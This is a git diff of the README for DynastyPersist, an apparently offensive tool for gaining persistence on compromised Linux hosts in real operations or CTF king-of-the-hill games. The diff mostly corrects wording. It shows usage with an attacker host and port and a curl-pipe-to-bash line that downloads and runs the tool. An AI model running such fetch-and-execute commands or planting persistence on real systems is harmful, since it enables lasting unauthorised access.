@@ -1,6 +1,6 @@
 
 
-<h1 align="center">DynastyPersist</h1>
+<h1 align="center">DynastyPersist 1.4</h1>
 
 <p align="center">
   DynastyPersist: A streamlined tool for achieving Linux persistence effortlessly.<br>
@@ -8,6 +8,7 @@
    <br>
   <img src="https://img.shields.io/github/license/trevohack/DynastyPersist" alt="GitHub License">
   <img src="https://img.shields.io/github/stars/trevohack/DynastyPersist" alt="GitHub Stars">
+  <img alt="Static Badge" src="https://img.shields.io/badge/Tested--on-Linux-violet?logo=linux">
 </p> 
 
 ## Documentation
@@ -33,11 +34,13 @@
 
 * Currently, there are 2 modes available in the latest update (1.4).
 
-* Modes are `normal` and `ctf` which are designed to work in a specific behaviour.
+* Modes are `normal` and `ctf` which are designed to work in a specific behavior.
 
-* Firstly, `normal` mode enters the tool in the usual setup, with all features. Theses features will run locally on the local host where the script is being executed. Desgined for persistence in real-time operations.
+* Firstly, `normal` mode enters the tool in the usual setup, with all features. These features will run locally on the local host where the script is being executed. Designed for persistence in real-time operations.
 
-* Secondly, `ctf` (beta) mode is an extra feature to login to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 
+* Secondly, `ctf` (beta) mode is an extra feature to log in to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 
+
+* In comparison, the `normal` mode comes with more features and stability than the `ctf` mode. 
 
 ### [ USAGE ] 
 
@@ -45,7 +48,7 @@
 
 ```bash
 $ ./dynasty.sh <lhost> <lport> <mode> 
-$ ./dynasty.sh 10.10.14.3 9999 ctf 
+$ ./dynasty.sh ctf 
 $ ./dynasty.sh 10.10.14.3 9999 normal
 ``` 
 
@@ -60,4 +63,6 @@ $ cd DynastyPersist/src
 Via Curl 
 ```bash
 $ curl -sSL https://raw.githubusercontent.com/Trevohack/DynastyPersist/main/src/dynasty.sh | bash
-``` 
+```
+
+
